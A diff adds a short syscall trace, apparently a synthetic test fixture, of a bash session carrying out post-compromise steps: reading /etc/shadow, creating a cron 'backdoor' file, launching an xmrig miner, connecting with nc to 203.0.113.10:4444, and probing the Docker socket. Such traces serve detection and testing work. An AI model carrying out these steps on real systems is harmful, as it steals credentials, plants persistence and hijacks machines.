@@ -1,0 +1,21 @@
+[pid  2000] 12:00:01.000000 execve("/bin/bash", ["bash", "-i"], 0x7ffd1234 /* 12 vars */) = 0
+[pid  2000] 12:00:01.000500 openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
+[pid  2000] 12:00:02.000000 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD, child_tidptr=0x7f3b2c6e5a10) = 2001
+[pid  2001] 12:00:02.000100 execve("/bin/cat", ["cat", "/etc/shadow"], 0x55d8d0e4c2a0 /* 12 vars */) = 0
+[pid  2001] 12:00:02.000200 openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = 3</etc/shadow>
+[pid  2001] 12:00:02.000300 +++ exited with 0 +++
+[pid  2000] 12:00:03.000000 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD, child_tidptr=0x7f3b2c6e5a10) = 2002
+[pid  2002] 12:00:03.000100 execve("/bin/touch", ["touch", "/etc/cron.d/backdoor"], 0x55d8d0e4c2a0 /* 12 vars */) = 0
+[pid  2002] 12:00:03.000200 openat(AT_FDCWD, "/etc/cron.d/backdoor", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3</etc/cron.d/backdoor>
+[pid  2002] 12:00:03.000300 +++ exited with 0 +++
+[pid  2000] 12:00:04.000000 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD, child_tidptr=0x7f3b2c6e5a10) = 2003
+[pid  2003] 12:00:04.000100 execve("/tmp/xmrig", ["/tmp/xmrig", "--url", "pool.example:3333"], 0x55d8d0e4c2a0 /* 12 vars */) = 0
+[pid  2000] 12:00:05.000000 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD, child_tidptr=0x7f3b2c6e5a10) = 2004
+[pid  2004] 12:00:05.000100 execve("/usr/bin/nc", ["nc", "203.0.113.10", "4444"], 0x55d8d0e4c2a0 /* 12 vars */) = 0
+[pid  2004] 12:00:05.000200 socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3<TCP:[12345]>
+[pid  2004] 12:00:05.000300 connect(3<TCP:[12345]>, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("203.0.113.10")}, 16) = 0
+[pid  2000] 12:00:06.000000 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD, child_tidptr=0x7f3b2c6e5a10) = 2005
+[pid  2005] 12:00:06.000100 execve("/usr/bin/curl", ["curl", "--unix-socket", "/var/run/docker.sock", "http://localhost/containers/json"], 0x55d8d0e4c2a0 /* 12 vars */) = 0
+[pid  2005] 12:00:06.000200 socket(AF_UNIX, SOCK_STREAM, 0) = 4<UNIX:[67890]>
+[pid  2005] 12:00:06.000300 connect(4<UNIX:[67890]>, {sa_family=AF_UNIX, sun_path="/var/run/docker.sock"}, 110) = 0
+[pid  2000] 12:00:07.000000 +++ exited with 0 +++
